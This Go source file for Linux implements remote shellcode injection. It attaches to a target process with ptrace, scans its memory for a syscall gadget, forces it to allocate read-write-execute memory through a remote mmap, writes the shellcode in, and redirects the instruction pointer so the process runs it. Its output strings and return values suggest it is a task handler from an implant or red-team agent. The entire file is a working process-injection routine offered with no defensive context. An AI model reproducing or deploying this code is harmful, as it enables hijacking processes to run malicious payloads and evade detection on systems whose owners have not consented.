//go:build linux

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

// injectShellcode injects shellcode into a remote process via ptrace on Linux.
// It:
//  1. Attaches to the target PID
//  2. Allocates memory via a remote mmap syscall
//  3. Writes shellcode via PTRACE_POKEDATA
//  4. Redirects RIP to the shellcode
//  5. Detaches so the process continues executing our shellcode
func injectShellcode(pid int, shellcode []byte) (string, string) {
	// Attach to target process
	if err := syscall.PtraceAttach(pid); err != nil {
		return fmt.Sprintf("ptrace attach failed: %v", err), "failed"
	}

	var ws syscall.WaitStatus
	if _, err := syscall.Wait4(pid, &ws, 0, nil); err != nil {
		return fmt.Sprintf("wait4 failed: %v", err), "failed"
	}

	// Save original registers
	var regs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("getregs failed: %v", err), "failed"
	}

	origRegs := regs

	// Invoke mmap in the target process to allocate RWX memory
	// Syscall number 9 = mmap on x86_64 Linux
	const mmap2Nr = 9
	regs.Rip = regs.Rip // will jump to a syscall gadget
	// Find syscall gadget by scanning /proc/<pid>/maps for executable regions
	gadget, err := findSyscallGadget(pid)
	if err != nil {
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("find syscall gadget: %v", err), "failed"
	}

	// Set up mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0)
	regs.Rax = mmap2Nr
	regs.Rdi = 0                 // addr = NULL
	regs.Rsi = uint64(len(shellcode) + 4096) // length
	regs.Rdx = 7                 // PROT_READ|PROT_WRITE|PROT_EXEC
	regs.R10 = 0x22              // MAP_PRIVATE|MAP_ANONYMOUS
	regs.R8  = ^uint64(0)        // fd = -1
	regs.R9  = 0                 // offset = 0
	regs.Rip = gadget

	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("setregs failed: %v", err), "failed"
	}

	// Single-step to execute mmap syscall
	if err := syscall.PtraceSingleStep(pid); err != nil {
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("single step failed: %v", err), "failed"
	}
	syscall.Wait4(pid, &ws, 0, nil)

	// Get returned mmap address from RAX
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("getregs after mmap: %v", err), "failed"
	}
	mmapAddr := uintptr(regs.Rax)
	if regs.Rax > ^uint64(0)-4096 { // mmap failed (returned negative)
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("remote mmap failed, rax=0x%x", regs.Rax), "failed"
	}

	// Write shellcode into the allocated region via PTRACE_POKEDATA
	if err := pokeBytes(pid, mmapAddr, shellcode); err != nil {
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("poke shellcode: %v", err), "failed"
	}

	// Restore registers but redirect RIP to shellcode
	origRegs.Rip = uint64(mmapAddr)
	if err := syscall.PtraceSetRegs(pid, &origRegs); err != nil {
		syscall.PtraceDetach(pid)
		return fmt.Sprintf("setregs to shellcode: %v", err), "failed"
	}

	// Detach — process will resume with RIP pointing at our shellcode
	if err := syscall.PtraceDetach(pid); err != nil {
		return fmt.Sprintf("detach failed: %v", err), "failed"
	}

	return fmt.Sprintf("[+] Injected %d bytes into PID %d at 0x%x", len(shellcode), pid, mmapAddr), "completed"
}

// pokeBytes writes data into the target process word-by-word via PTRACE_POKEDATA.
func pokeBytes(pid int, addr uintptr, data []byte) error {
	// Pad to word boundary
	wordSize := int(unsafe.Sizeof(uintptr(0)))
	padded := make([]byte, (len(data)+wordSize-1)/wordSize*wordSize)
	copy(padded, data)

	for i := 0; i < len(padded); i += wordSize {
		word := binary.LittleEndian.Uint64(padded[i : i+8])
		if _, _, errno := syscall.RawSyscall6(
			syscall.SYS_PTRACE,
			syscall.PTRACE_POKEDATA,
			uintptr(pid),
			addr+uintptr(i),
			uintptr(word),
			0, 0,
		); errno != 0 {
			return fmt.Errorf("pokedata at 0x%x: %w", addr+uintptr(i), errno)
		}
	}
	return nil
}

// findSyscallGadget finds the address of a "syscall; ret" (0F 05 C3) or "syscall" (0F 05)
// gadget in an executable mapping of the target process.
func findSyscallGadget(pid int) (uint64, error) {
	maps, err := os.ReadFile(fmt.Sprintf("/proc/%d/maps", pid))
	if err != nil {
		return 0, err
	}
	memFile, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", pid), os.O_RDONLY, 0)
	if err != nil {
		return 0, err
	}
	defer memFile.Close()

	for _, line := range strings.Split(string(maps), "\n") {
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		perms := fields[1]
		if !strings.Contains(perms, "x") {
			continue
		}
		parts := strings.Split(fields[0], "-")
		if len(parts) != 2 {
			continue
		}
		start, err1 := strconv.ParseUint(parts[0], 16, 64)
		end, err2 := strconv.ParseUint(parts[1], 16, 64)
		if err1 != nil || err2 != nil {
			continue
		}
		size := end - start
		if size > 16*1024*1024 { // skip huge mappings
			size = 16 * 1024 * 1024
		}
		buf := make([]byte, size)
		n, _ := memFile.ReadAt(buf, int64(start))
		for i := 0; i < n-1; i++ {
			if buf[i] == 0x0F && buf[i+1] == 0x05 {
				return start + uint64(i), nil
			}
		}
	}
	return 0, fmt.Errorf("no syscall gadget found")
}
